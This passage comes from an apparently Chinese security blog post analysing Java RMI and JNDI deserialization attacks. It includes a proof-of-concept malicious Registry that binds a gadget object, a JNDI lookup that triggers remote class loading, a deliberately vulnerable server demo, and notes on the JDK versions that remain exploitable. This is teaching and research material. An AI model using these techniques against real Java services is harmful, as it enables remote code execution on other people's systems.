</span></span><span class=line><span class=cl>        <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectInput</span> <span class=n>in</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=n>$param_String_1</span> <span class=o>=</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>String</span><span class=o>)</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=o>|</span> <span class=n>java</span><span class=o>.</span><span class=na>lang</span><span class=o>.</span><span class=na>ClassNotFoundException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>UnmarshalException</span><span class=o>(</span><span class=s>&#34;error unmarshalling arguments&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>finally</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>call</span><span class=o>.</span><span class=na>releaseInputStream</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>Remote</span> <span class=n>$result</span> <span class=o>=</span> <span class=n>server</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=n>$param_String_1</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>ObjectOutput</span> <span class=n>out</span> <span class=o>=</span> <span class=n>call</span><span class=o>.</span><span class=na>getResultStream</span><span class=o>(</span><span class=kc>true</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=na>writeObject</span><span class=o>(</span><span class=n>$result</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>catch</span> <span class=o>(</span><span class=n>java</span><span class=o>.</span><span class=na>io</span><span class=o>.</span><span class=na>IOException</span> <span class=n>e</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>throw</span> <span class=k>new</span> <span class=n>java</span><span class=o>.</span><span class=na>rmi</span><span class=o>.</span><span class=na>MarshalException</span><span class=o>(</span><span class=s>&#34;error marshalling return&#34;</span><span class=o>,</span> <span class=n>e</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，首先是反序列化Client传过来的序列化数据（ <code>$param_String_1 = (java.lang.String) in.readObject()</code> ），然后通过 <code>out.writeObject($result)</code> 序列化一个对象传给Client，这个对象从Server端，前面分析过，Client会进行反序列化，从而被R。所以可以看到，Registry也对Client传过来的数据进行了反序列化，所以理论上，Client通过lookup操作也可以攻击Registry，但是前面也分析过了，<code>RegistryImpl_Stub#lookup()</code> 只支持String类型的形参，所以没办法直接传任意类型的数据给Registry，但是可以绕。</p><p>例如如下方式，假设其是一个可被攻击者控制Registry地址的脆弱Client：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * 基于传统方式的RMI
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>traditionalRmi</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;Hack&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>getRegistry</span><span class=o>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=o>,</span> <span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>registry</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=n>name</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>攻击者伪造的恶意Registry如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>name</span><span class=o>=</span><span class=s>&#34;Hack&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>createRegistry</span><span class=o>(</span><span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=n>registry</span><span class=o>.</span><span class=na>bind</span><span class=o>(</span><span class=n>name</span><span class=o>,</span> <span class=n>cc2Gadget</span><span class=o>());</span>
</span></span><span class=line><span class=cl>    <span class=k>new</span> <span class=n>CountDownLatch</span><span class=o>(</span><span class=n>1</span><span class=o>).</span><span class=na>await</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Client发起请求后，将会反序列化攻击者Registry构造的恶意序列化对象。效果如下：</p><p><img src=/media/2021-07-29-10.png alt></p><p>可能有的人会发出疑问？不是说Registry的bind操作会造成反序列化嘛，为啥上面的 <code>registry.bind(name, cc2Gadget())</code> 没反序列化？</p><p>前面说过，Client或者Server端通过 <code>LocateRegistry#getRegistry()</code> 获取到的实际上是 <code>RegistryImpl_Stub</code> 类型对象，用于和注册中心的 <code>RegistryImpl_Skel</code> 进行通信，反序列化的点就发生在注册中心的 <code>RegistryImpl_Skel#bind()</code> 中。</p><p>而注册中心通过 <code>LocateRegistry.createRegistry()</code> 获取的实际上是 <code>RegistryImpl</code> 类型对象，所以上面调用的其实是 <code>RegistryImpl#bind()</code> 方法，这个方法里不进行反序列化操作，所以直接在注册中心进行bind操作不会进行反序列化。</p><p>如果Client不是使用传统的RMI方式（ <code>RegistryImpl_Stub#lookup()</code> ）来进行RMI调用的，而是使用JNDI的方式（ <code>InitialContext#lookup()</code> 方式）来进行RMI调用的，那么就可以使用 <code>Refererence Gadget</code> 来进行攻击，此种攻击方式无需Client存在Gadget即可造成RCE；</p><p>例如如下方式就是使用基于JNDI的RMI请求（测试版本：JDK8u20）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * 使用JNDI方式的RMI
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>rmiUnderJndi</span><span class=o>()</span><span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>String</span> <span class=n>jndiUrl</span><span class=o>=</span><span class=s>&#34;rmi://127.0.0.1:1099/Hack&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=n>InitialContext</span> <span class=n>initialContext</span> <span class=o>=</span> <span class=k>new</span> <span class=n>InitialContext</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=n>initialContext</span><span class=o>.</span><span class=na>lookup</span><span class=o>(</span><span class=n>jndiUrl</span><span class=o>);</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>我们首先看到Gadget Chain：</p><p><img src=/media/image-20210806145754723.png alt=image-20210806145754723></p><p>我们首先看到 <code>RegistryContext#lookup()</code> ：</p><p><img src=/media/image-20210806150634154.png alt=image-20210806150634154></p><p>然后继续看到 <code>NamingManager#getObjectInstance()</code> ：</p><p><img src=/media/image-20210806154050044.png alt=image-20210806154050044></p><p>其实看到这里，意思就很明显了，从Refererence（远程）中获取一个ObjectFactory。问题就出现在这个 <code>NamingManager#getObjectFactoryFromReference()</code> 中：</p><p><img src=/media/image-20210806154516887.png alt=image-20210806154516887></p><p>最终会在 <code>VersionHelper12#loadClass()</code> 中调用如下方法加载远程的Class， <strong>并且执行类初始化</strong> ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>loadClass</span><span class=o>(</span><span class=n>String</span> <span class=n>className</span><span class=o>,</span> <span class=n>ClassLoader</span> <span class=n>cl</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=kd>throws</span> <span class=n>ClassNotFoundException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 第二个参数为true代表执行类初始化
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// 所以恶意代码写在静态初始化块内就能在此处进行执行了
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>cls</span> <span class=o>=</span> <span class=n>Class</span><span class=o>.</span><span class=na>forName</span><span class=o>(</span><span class=n>className</span><span class=o>,</span> <span class=kc>true</span><span class=o>,</span> <span class=n>cl</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cls</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到这个地方是直接加载字节码到内存，并且执行类初始化，我们将恶意代码写在静态初始化块中，此处就会执行。不需要Client存在任何Gadget，非常优美~</p><p>JDK8u121的时候， <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认为false，rmi不能从远程加载了，所以基于RMI的JNDI没法打了。但是 <code>JDK8u121 &lt;= JDK Version &lt;= JDK8u191</code> 时，使用Ldap的JNDI仍然可以打，因为这个版本区间内， <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 默认为true。</p><p>我们首先看到Gadget Chain：</p><p><img src=/media/image-20210806165112054.png alt=image-20210806165112054></p><p>可以看到，和RMI的攻击方式差不多，都是利用Reference从远程加载类，并且执行类初始化。</p><h3 id=攻击server>攻击Server</h3><p>注意，此处分析的是攻击Server端，不要和Registry弄混淆了。有的demo代码中，Registry和Service放在一起，容易弄混淆攻击对象。</p><p>攻击Server存在如下攻击方式：</p><ul><li>JDK Version &lt; JDK8u242时，只需要找到Service接口中，存在String（或者其他任意非基本参数类型）、Object或者Serializable类型的形参的方法，我们通过Client调用这个接口方法，传递恶意序列化对象作为形参，Server端会调用 <code>readObject()</code> 进行反序列化，由此被攻击。</li><li>JDK Version > JDK8u242时，类型为String类型的形参对应的接口方法不能再被反序列化攻击了。但是Object和Serializable类型还可以用。</li></ul><p>首先准备好demo：</p><p>以下是Registry的代码（不分析攻击Registry）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/7 18:14
</span></span></span><span class=line><span class=cl><span class=cm> * 模拟RMI注册中心
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>HelloRegistry</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span><span class=kd>throws</span> <span class=n>Exception</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>createRegistry</span><span class=o>(</span><span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=k>new</span> <span class=n>CountDownLatch</span><span class=o>(</span><span class=n>1</span><span class=o>).</span><span class=na>await</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>以下是Service的定义和实现代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/6 18:31
</span></span></span><span class=line><span class=cl><span class=cm> * Service接口
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>interface</span> <span class=nc>HelloService</span> <span class=kd>extends</span> <span class=n>Remote</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=nf>sayHello</span><span class=o>(</span><span class=n>String</span> <span class=n>str</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>RemoteException</span><span class=o>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>void</span> <span class=nf>poke</span><span class=o>(</span><span class=n>Object</span> <span class=n>object</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>RemoteException</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/6 18:32
</span></span></span><span class=line><span class=cl><span class=cm> * Service实现
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>HelloServiceImpl</span> <span class=kd>extends</span> <span class=n>UnicastRemoteObject</span> <span class=kd>implements</span> <span class=n>HelloService</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>protected</span> <span class=nf>HelloServiceImpl</span><span class=o>()</span> <span class=kd>throws</span> <span class=n>RemoteException</span> <span class=o>{</span> <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>sayHello</span><span class=o>(</span><span class=n>String</span> <span class=n>str</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>RemoteException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;Server received str:&#34;</span><span class=o>+</span><span class=n>str</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@Override</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kt>void</span> <span class=nf>poke</span><span class=o>(</span><span class=n>Object</span> <span class=n>object</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>RemoteException</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;Server received object:&#34;</span><span class=o>+</span><span class=n>object</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>以下是向注册中心注册一个HelloService服务：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=cm>/**
</span></span></span><span class=line><span class=cl><span class=cm> * @author : p1n93r
</span></span></span><span class=line><span class=cl><span class=cm> * @date : 2021/8/6 18:29
</span></span></span><span class=line><span class=cl><span class=cm> * 模拟脆弱的服务端
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=kd>public</span> <span class=kd>class</span> <span class=nc>WeakServer</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=kd>static</span> <span class=kt>void</span> <span class=nf>main</span><span class=o>(</span><span class=n>String</span><span class=o>[]</span> <span class=n>args</span><span class=o>)</span> <span class=kd>throws</span> <span class=n>Exception</span><span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Registry</span> <span class=n>registry</span> <span class=o>=</span> <span class=n>LocateRegistry</span><span class=o>.</span><span class=na>getRegistry</span><span class=o>(</span><span class=s>&#34;127.0.0.1&#34;</span><span class=o>,</span> <span class=n>1099</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>HelloServiceImpl</span> <span class=n>helloService</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HelloServiceImpl</span><span class=o>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Bind a service to the registry
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>registry</span><span class=o>.</span><span class=na>bind</span><span class=o>(</span><span class=s>&#34;hello&#34;</span><span class=o>,</span><span class=n>helloService</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=n>System</span><span class=o>.</span><span class=na>out</span><span class=o>.</span><span class=na>println</span><span class=o>(</span><span class=s>&#34;RMI server is ready&#34;</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>在讲攻击之前，先讲攻击原理。为啥调用Server端的形参含有Object、Serializable以及String类型的接口方法，可以造成Server端反序列化攻击呢？首先看到Server端的 <code>sun.rmi.server.UnicastServerRef#dispatch()</code> 代码片段（JDK8u20）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=c1>// unmarshal parameters
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Class</span><span class=o>&lt;?&gt;[]</span> <span class=n>types</span> <span class=o>=</span> <span class=n>method</span><span class=o>.</span><span class=na>getParameterTypes</span><span class=o>();</span>
</span></span><span class=line><span class=cl><span class=n>Object</span><span class=o>[]</span> <span class=n>params</span> <span class=o>=</span> <span class=k>new</span> <span class=n>Object</span><span class=o>[</span><span class=n>types</span><span class=o>.</span><span class=na>length</span><span class=o>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=n>unmarshalCustomCallData</span><span class=o>(</span><span class=n>in</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Unmarshal the parameters
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=o>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=n>0</span><span class=o>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>types</span><span class=o>.</span><span class=na>length</span><span class=o>;</span> <span class=n>i</span><span class=o>++)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=n>params</span><span class=o>[</span><span class=n>i</span><span class=o>]</span> <span class=o>=</span> <span class=n>unmarshalValue</span><span class=o>(</span><span class=n>types</span><span class=o>[</span><span class=n>i</span><span class=o>],</span> <span class=n>in</span><span class=o>);</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到，逻辑就是：获取Client端发送的参数类型，然后调用 <code>unmarshalValue()</code> 方法反序列化Client传递过来的参数值。我们继续跟进 <code>unmarshalValue()</code> 方法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>protected</span> <span class=kd>static</span> <span class=n>Object</span> <span class=nf>unmarshalValue</span><span class=o>(</span><span class=n>Class</span><span class=o>&lt;?&gt;</span> <span class=n>type</span><span class=o>,</span> <span class=n>ObjectInput</span> <span class=n>in</span><span class=o>)</span>
</span></span><span class=line><span class=cl>    <span class=kd>throws</span> <span class=n>IOException</span><span class=o>,</span> <span class=n>ClassNotFoundException</span>
</span></span><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=o>(</span><span class=n>type</span><span class=o>.</span><span class=na>isPrimitive</span><span class=o>())</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>int</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Integer</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readInt</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>boolean</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Boolean</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readBoolean</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>byte</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Byte</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readByte</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>char</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Character</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readChar</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>short</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Short</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readShort</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>long</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Long</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readLong</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>float</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Float</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readFloat</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=k>if</span> <span class=o>(</span><span class=n>type</span> <span class=o>==</span> <span class=kt>double</span><span class=o>.</span><span class=na>class</span><span class=o>)</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>Double</span><span class=o>.</span><span class=na>valueOf</span><span class=o>(</span><span class=n>in</span><span class=o>.</span><span class=na>readDouble</span><span class=o>());</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>            <span class=k>throw</span> <span class=k>new</span> <span class=n>Error</span><span class=o>(</span><span class=s>&#34;Unrecognized primitive type: &#34;</span> <span class=o>+</span> <span class=n>type</span><span class=o>);</span>
</span></span><span class=line><span class=cl>        <span class=o>}</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span> <span class=k>else</span> <span class=o>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>in</span><span class=o>.</span><span class=na>readObject</span><span class=o>();</span>
</span></span><span class=line><span class=cl>    <span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
